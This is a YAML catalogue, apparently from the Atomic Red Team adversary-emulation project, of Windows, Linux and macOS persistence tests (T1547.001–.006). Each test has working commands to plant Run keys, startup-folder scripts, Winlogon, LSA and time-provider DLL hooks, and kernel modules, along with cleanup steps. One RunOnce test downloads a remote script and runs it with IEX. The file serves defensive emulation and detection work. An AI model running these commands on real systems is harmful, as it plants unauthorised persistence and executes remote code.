    Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

    The following run keys are created by default on Windows systems:

    * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
    * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
    * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
    * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

    Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

    Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

    The following Reg...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Reg Key Run
      type: cmd
      platform: windows
      command: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
      cleanup: REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Reg Key RunOnce
      type: cmd
      platform: windows
      command: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
      cleanup: REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: PowerShell Registry RunOnce
      type: powershell
      platform: windows
      command: |-
        $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
      cleanup: Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Suspicious vbs file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
        cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
        cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Suspicious jse file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\jsestartup.jse" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
        cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
        cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Suspicious bat file run from startup Folder
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
        Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
        Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
        Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
      cleanup: |-
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
        Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Add Executable Shortcut Link to User Startup Folder
      type: powershell
      platform: windows
      command: |-
        $Target = "C:\Windows\System32\calc.exe"
        $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
        $Create.TargetPath = $Target
        $Create.Save()
      cleanup: Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Add persistance via Recycle bin
      type: cmd
      platform: windows
      command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
      cleanup: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
      timeout: 120
      is_safe: true
    - name: SystemBC Malware-as-a-Service Registry
      type: powershell
      platform: windows
      command: |-
        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
      cleanup: Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "socks5_powershell" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
      type: powershell
      platform: windows
      command: |-
        New-Item -ItemType Directory -path "$env:TMP\atomictest\"
        Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
        Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "$env:TMP\atomictest\"
      cleanup: |-
        Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
        Remove-Item "$env:TMP\atomictest\" -Recurse -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
      type: powershell
      platform: windows
      command: |-
        New-Item -ItemType Directory -path "$env:TMP\atomictest\"
        Copy-Item -path "C:\Windows\System32\calc.exe" -destination "$env:TMP\atomictest\"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:TMP\atomictest\"
      cleanup: |-
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        Remove-Item "$env:TMP\atomictest\" -Recurse -Force
      timeout: 120
      is_safe: true
    - name: HKCU - Policy Settings Explorer Run Key
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")){
          New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        }
        if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
          New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        }
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"
      cleanup: Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKLM - Policy Settings Explorer Run Key
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
          New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
        }
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest" -Value "C:\Windows\System32\calc.exe"
      cleanup: Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "atomictest"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKLM - Append Command to Winlogon Userinit KEY Value
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
        $newvalue = $oldvalue + " C:\Windows\System32\calc.exe";
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: 'HKLM - Modify default System Shell - Winlogon Shell KEY Value '
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
        $newvalue = $oldvalue + ", C:\Windows\explorer.exe";
        Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup');
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: secedit used to create a Run key in the HKLM Hive
      type: cmd
      platform: windows
      command: |-
        secedit /import /db mytemplate.db /cfg "$PathToAtomicsFolder\T1547.001\src\regtemplate.ini"
        secedit /configure /db mytemplate.db
      cleanup: REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "calc" /f >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Modify BootExecute Value
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" /y }
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "autocheck autoche *" -Type MultiString
      cleanup: |-
        reg.exe import "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"
        Remove-Item -Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Allowing custom application to execute during new RDP logon session
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "calc"
      cleanup: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" /f /v StartupPrograms /t REG_SZ /d "rdpclip"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Creating Boot Verification Program Key for application execution during successful boot
      type: cmd
      platform: windows
      command: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d "C:\Program Files\Internet Explorer\iexplore.exe"
      cleanup: reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Add persistence via Windows Context Menu
      type: cmd
      platform: windows
      command: reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
      cleanup: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify" /f
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/001
  is_safe: true
- id: T1547.002
  name: Authentication Package
  description: |-
    Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)

    Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Authentication Package
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f
      cleanup: |-
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
        rm -force C:\windows\system32\package.dll
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/002
  is_safe: false
- id: T1547.003
  name: Time Providers
  description: |-
    Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

    Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)

    Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Create a new time provider
      type: powershell
      platform: windows
      command: |-
        net stop w32time
        Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f
        net start w32time
      cleanup: |-
        net stop w32time
        reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /f
        rm -force C:\Users\Public\AtomicTest.dll
        net start w32time
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Edit an existing time provider
      type: powershell
      platform: windows
      command: |-
        net stop w32time
        Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f
        net start w32time
      cleanup: |-
        net stop w32time
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Windows\SYSTEM32\w32time.DLL" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "0" /f
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "0" /f
        rm -force C:\Users\Public\AtomicTest.dll
        net start w32time
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/003
  is_safe: false
- id: T1547.004
  name: Winlogon Helper DLL
  description: "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Winlogon Shell Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Winlogon Userinit Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Winlogon Notify Key Logon Persistence - PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "C:\Windows\Temp\atomicNotificationPackage.dll" -Type ExpandString -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "AtomicTestFunction" -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
      cleanup: Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Winlogon HKLM Shell Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Shell" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Winlogon HKLM Userinit Key Persistence - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" -Name "Userinit" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1547/004
  is_safe: true
- id: T1547.005
  name: Security Support Provider
  description: |-
    Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

    The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - windows
  executors:
    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";
        $newvalue = "AtomicTest.dll";
        Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
        Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old';
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry
      type: powershell
      platform: windows
      command: |-
        $oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' -Value "$oldvalue";
        $newvalue = "AtomicTest.dll";
        Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value $newvalue
      cleanup: |-
        $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old' | Select-Object -ExpandProperty 'Security Packages old');
        Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -Value "$oldvalue";
        Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages old';
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/005
  is_safe: false
- id: T1547.006
  name: Kernel Modules and Extensions
  description: |-
    Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 

    When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)

    Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)

    Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as "Legacy System Extensions" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)

    Adversaries can use LKMs and kexts to conduct [Persistence...
  tactic: persistence
  tactics:
    - persistence
    - privilege-escalation
  platforms:
    - macos
    - linux
  executors:
    - name: Linux - Load Kernel Module via insmod
      type: bash
      platform: linux
      command: sudo insmod /tmp/T1547.006/T1547006.ko
      cleanup: |-
        sudo rmmod T1547006
        [ -f /tmp/T1547.006/safe_to_delete ] && rm -rf /tmp/T1547.006
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: MacOS - Load Kernel Module via kextload and kmutil
      type: bash
      platform: macos
      command: |-
        set -x
        sudo kextload /Library/Extensions/SoftRAID.kext
        kextstat 2>/dev/null | grep SoftRAID
        sudo kextunload /Library/Extensions/SoftRAID.kext
        sudo kmutil load -p /Library/Extensions/SoftRAID.kext
        kextstat 2>/dev/null | grep SoftRAID
        sudo kmutil unload -p /Library/Extensions/SoftRAID.kext
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: MacOS - Load Kernel Module via KextManagerLoadKextWithURL()
      type: bash
      platform: macos
      command: |-
        sudo /tmp/T1547006_iokit_loader
        kextstat 2>/dev/null | grep SoftRAID
        sudo kextunload /Library/Extensions/SoftRAID.kext
      cleanup: rm -f /tmp/T1547006_iokit_loader
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1547/006
  is_safe: false
- id: T1547.007
  name: Re-opened Applications
  description: |-
